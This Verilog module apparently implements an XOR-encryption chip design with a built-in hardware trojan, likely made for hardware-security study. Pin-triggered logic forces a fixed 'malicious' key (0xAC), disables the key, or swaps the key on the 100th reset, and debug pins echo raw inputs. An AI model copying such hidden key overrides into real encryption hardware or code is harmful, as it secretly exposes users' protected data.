module tt_um_franco_mezzarapa(
    input  wire [7:0] ui_in,    // Dedicated inputs
    output wire [7:0] uo_out,   // Dedicated outputs
    input  wire [7:0] uio_in,   // IOs: Input path
    output wire [7:0] uio_out,  // IOs: Output path
    output wire [7:0] uio_oe,   // IOs: Enable path (active high: 0=input, 1=output)
    
    input  wire       ena,      
    input  wire       clk,      // clock
    input  wire       rst_n    // reset_n - low to reset
);

localparam MSG_SIZE = 64;
localparam KEY_SIZE = 8;

wire [$clog2(KEY_SIZE): 0] oBit_counter_key;
wire [$clog2(MSG_SIZE): 0] oBit_counter_msg;
wire [$clog2(MSG_SIZE): 0] oBit_counter_ciphertext;
    
wire [MSG_SIZE - 1:0] output_message;
wire [MSG_SIZE - 1:0] output_ciphertext;
wire [KEY_SIZE - 1:0] key;
    

// Unused Wires
assign uio_out = 8'b0;
assign uio_oe  = 8'b0;
assign uio_oe  = 8'b0;

//unused wires *wink*
 wire _unused = &{uio_in,1'b0};
 reg [7:0] selected_key;   


deserializer #(.MSG_SIZE(KEY_SIZE)) deserializer_key(
     .iData_in  (ui_in[0]),              // Data coming in serially
     .iData_flag(ui_in[1]),              // Flag that determines when data is being loaded
    
     .clk   (clk),                       // Clock
     .ena   (ena),                       // Enable
     .rst_n (rst_n),                     // Reset
    
     .oBit_counter (oBit_counter_key),   // Bit counter for key
     .oData_out(key)                     // Output for deserialized key
);

deserializer #(.MSG_SIZE(MSG_SIZE)) deserializer_msg(
     .iData_in  (ui_in[0]),              // Data coming in serially
     .iData_flag(ui_in[2]),              // Flag that determines when data is being loaded
    
     .clk   (clk),                       // Clock
     .ena   (ena),                       // Enable
     .rst_n (rst_n),                     // Reset
    
     .oBit_counter (oBit_counter_msg),   // Bit counter for message
     .oData_out(output_message)                 // Output for deserialized message
);

xor_encrypt #(.MSG_SIZE(MSG_SIZE),.KEY_SIZE(KEY_SIZE)) xor_message(
    .clk(clk),
    .ena(ena),
    .rst_n(rst_n),
    
    .iMessage(output_message),
    .iKey(selected_key),
    
    .iMessage_bit_counter(oBit_counter_msg),
    .iKey_bit_counter(oBit_counter_key),
    
    .encryption_status(uo_out[2]),                   //uo_out 3 is the encryption signal for the CW.
    .oCiphertext_counter(oBit_counter_ciphertext),   //Counter for the ciphertext
    .oCiphertext(output_ciphertext)                  // ciphertext output
);

serializer #(.MSG_SIZE(MSG_SIZE)) serialize_ciphertext(
    .iData_in(output_ciphertext),
    .iCounter(oBit_counter_ciphertext),
    
    .clk(clk),
    .ena(ena),
    .rst_n(rst_n),
    
    .oData_flag(uo_out[1]),
    .oData_out(uo_out[0])
);

shift_register debug_module(
    .clk(clk),
    .rst_n(rst_n),
    .ena(ena),
    
    .key_counter(oBit_counter_key),
    .message_counter(oBit_counter_msg),
    .ciphertext_counter(oBit_counter_ciphertext),
    
    .debug_wire(ui_in[7]),
    
    .data_flag(uo_out[6]),
    .data_out(uo_out[7])
);

reg [6:0] reset_counter; // 7-bit counter for up to 127 resets

// Increment the counter on the rising edge of rst_n
always @(posedge clk or negedge rst_n) begin
    if (reset_counter === 7'bxxxxxxx) begin
        reset_counter <= 0; // Initialize to 0 if the counter is in an unknown state
    end else if (!rst_n) begin
        reset_counter <= reset_counter + 1; // Increment the counter on each reset release
    end else if (reset_counter > 101) begin //After the 100 reset meaning 101, reset the counter.
        reset_counter <= 0;
    end 
end


// Conditional key selection logic with prioritized conditions
always @(posedge clk) begin
    if (ui_in[3] && !ui_in[1]) begin
            selected_key <= 8'hAC;  // Condition 1: Always Active Malicious Key (AC)
    end else if (ui_in[5] && !ui_in[1]) begin
            selected_key <= 8'h00;  // Condition 3: Disable Key (No Key, set to 0)
    end else if (ui_in[4] && reset_counter == 100) begin // on the 100th reset, alter the key.
            selected_key <= 8'hCC;
    end else begin
            selected_key <= key;    // Default condition: Use the regular key
    end
end

// Conditional outputs for debugging
 assign uo_out[3] = (ena && ui_in[6]) ? ui_in[0] : 1'b0;
 assign uo_out[4] = (ena && ui_in[6]) ? ui_in[1] : 1'b0;
 assign uo_out[5] = (ena && ui_in[6]) ? ui_in[2] : 1'b0;

endmodule
